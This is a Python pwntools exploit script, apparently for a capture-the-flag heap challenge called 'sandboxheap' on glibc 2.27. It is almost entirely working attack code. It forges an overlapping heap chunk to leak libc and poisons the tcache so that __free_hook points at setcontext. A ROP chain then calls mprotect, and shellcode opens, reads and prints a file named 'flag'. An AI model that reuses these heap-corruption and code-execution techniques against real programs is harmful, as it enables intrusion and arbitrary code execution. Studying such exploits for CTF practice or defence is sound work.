from pwn import *

context(arch='amd64', os='linux', log_level='debug')

file_name = './sandboxheap'

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

context.terminal = ['tmux','splitw','-h']

debug = 0
if debug:
    r = remote()
else:
    r = process(argv = ['./sandbox', file_name])
    #r = process(file_name)

elf = ELF(file_name)

def dbg():
    gdb.attach(r)

def decode(x):
 return bin(x)[2:].rjust(64)[::-1]

menu = 'Your choice: '

def add(index, size):
    r.sendlineafter(menu, '1')
    r.sendlineafter('Index: ', str(index))
    r.sendlineafter('Size: ', str(size))

def edit(index, content):
    r.sendlineafter(menu, '2')
    r.sendlineafter('Index: ', str(index))
    r.sendafter('Content: ', content)

def show(index):
    r.sendlineafter(menu, '3')
    r.sendlineafter('Index: ', str(index))

def delete(index):
    r.sendlineafter(menu, '4')
    r.sendlineafter('Index: ', str(index))

for i in range(7):
    add(i, 0xf8)    #0 - 6

add(7, 0xf8)
add(8, 0x88)
add(9, 0xf8)
add(10, 0x10)

for i in range(8):
    delete(i)

edit(8, '1' * 0x80 * 8 + decode(0x190) + '\x00')

delete(9)

for i in range(7):
    add(i, 0xf8)

add(7, 0xf8)

show(8)

malloc_hook = u64(r.recvuntil('\x7f')[-6:].ljust(8, b'\x00')) - 96 - 0x10
li('malloc_hook = ' + hex(malloc_hook))
libc = ELF('./2.27-3ubuntu1.6_amd64/libc-2.27.so')

libc_base = malloc_hook - libc.sym['__malloc_hook']
li('libc_base = ' + hex(libc_base))

free_hook = libc_base + libc.sym['__free_hook']
li('free_hook = ' + hex(free_hook))

setcontext = libc_base + libc.sym['setcontext'] + 53
li('setcontext = ' + hex(setcontext))

add(11, 0xf8)
delete(8)

edit(11, decode(free_hook))
add(8, 0xf8)
add(12, 0xf8)

edit(12, decode(setcontext))

syscall=libc_base+libc.search(asm("syscall\nret")).__next__()
li('syscall = ' + hex(syscall))

add(13, 0xf8)

rsp = free_hook&0xfffffffffffff000
rsi = rsp
p1 = decode(0) * 14
p1 += decode(rsi) + decode(0) * 2 + decode(0x2000) + decode(0) * 2
p1 += decode(rsp)
p1 += decode(syscall)
edit(13, p1)
delete(13)

layout = [
    libc_base+libc.search(asm("pop rdi\nret")).__next__(), #: pop rdi; ret;
    free_hook & 0xfffffffffffff000,
    libc_base+libc.search(asm("pop rsi\nret")).__next__(), #: pop rsi; ret;
    0x2000,
    libc_base+libc.search(asm("pop rdx\nret")).__next__(), #: pop rdx; ret;
    7,
    libc_base+libc.search(asm("pop rax\nret")).__next__(), #: pop rax; ret;
    10,
    syscall, #: syscall; ret;
    libc_base+libc.search(asm("jmp rsp")).__next__(), #: jmp rsp;
]

shellcode = asm('''
mov edi,3
mov eax, 0x2710
syscall
sub rsp, 0x800
push 0x67616c66
mov rdi, rsp
xor esi, esi
mov eax, 2
syscall

cmp eax, 0
js failed

mov edi, eax
mov rsi, rsp
mov edx, 0x100
xor eax, eax
syscall

mov edx, eax
mov rsi, rsp
mov edi, 1
mov eax, edi
syscall

jmp exit

failed:
push 0x6c696166
mov edi, 1
mov rsi, rsp
mov edx, 4
mov eax, edi
syscall

exit:
xor edi, edi
mov eax, 231
syscall
''')

r.send(flat(layout) + shellcode)

r.interactive()
